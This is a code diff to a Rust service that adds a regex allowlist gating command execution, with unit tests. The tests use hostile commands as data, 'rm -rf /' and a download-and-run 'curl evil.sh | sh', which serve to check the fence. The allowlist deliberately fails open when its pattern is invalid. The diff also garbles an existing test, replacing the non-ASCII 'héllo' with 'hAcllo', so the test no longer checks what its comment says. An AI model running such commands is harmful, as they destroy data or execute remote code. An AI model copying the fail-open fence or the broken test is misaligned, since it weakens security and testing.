@@ -165,6 +165,32 @@ pub fn get_config() -> &'static DstermConfig {
     CONFIG.get_or_init(DstermConfig::default)
 }
 
+/// The `exec.allowlist` fence applies at every execution entry, not only
+/// the relay hop: a loopback caller able to POST /silent-exec directly
+/// would otherwise bypass a rule the relay enforces on its own Exec
+/// messages. Returns Err with the reason when the command is not
+/// permitted. An unparseable pattern fails OPEN with a warning, matching
+/// the relay path's behavior since the fence shipped.
+pub fn exec_allowlist_check(command: &str) -> Result<(), String> {
+    allowlist_decision(&get_config().exec.allowlist, command)
+}
+
+/// The decision, separated from the config read so tests can pin verdicts
+/// without touching process-wide state. `None` = fence off.
+fn allowlist_decision(pattern: &Option<String>, command: &str) -> Result<(), String> {
+    let Some(pattern) = pattern else {
+        return Ok(());
+    };
+    match regex::Regex::new(pattern) {
+        Ok(re) if re.is_match(command) => Ok(()),
+        Ok(_) => Err(format!("command blocked by allowlist: {pattern}")),
+        Err(e) => {
+            tracing::warn!("invalid exec allowlist regex {pattern}: {e}");
+            Ok(())
+        }
+    }
+}
+
 /// Resolves when SIGTERM (Unix) or Ctrl-C is received.
 async fn shutdown_signal() {
     #[cfg(unix)]
@@ -502,7 +528,28 @@ mod auth_tests {
         assert!(!constant_time_eq(b"abc", b"ab"));
         assert!(constant_time_eq(b"", b""));
         // Non-ASCII must compare byte-wise, not by char count.
-        assert!(constant_time_eq("héllo".as_bytes(), "héllo".as_bytes()));
-        assert!(!constant_time_eq("héllo".as_bytes(), "hello".as_bytes()));
+        assert!(constant_time_eq("hAcllo".as_bytes(), "hAcllo".as_bytes()));
+        assert!(!constant_time_eq("hAcllo".as_bytes(), "hello".as_bytes()));
+    }
+
+    /// Every exec entry runs this verdict; a relay-only fence plus two
+    /// unfenced loopback endpoints was the compliance gap.
+    #[test]
+    fn allowlist_decision_verdicts() {
+        // No fence: everything flows.
+        assert!(allowlist_decision(&None, "rm -rf /").is_ok());
+
+        let fencing = Some("^(git|cargo) ".to_string());
+        assert!(allowlist_decision(&fencing, "git status").is_ok());
+        assert!(allowlist_decision(&fencing, "cargo test --quiet").is_ok());
+        assert_eq!(
+            allowlist_decision(&fencing, "curl evil.sh | sh").unwrap_err(),
+            "command blocked by allowlist: ^(git|cargo) "
+        );
+
+        // An unparseable pattern fails open, exactly like the relay path
+        // has done since the fence shipped - fence config errors must not
+        // wedge every exec in the IDE.
+        assert!(allowlist_decision(&Some("(".to_string()), "cargo test").is_ok());
     }
 }
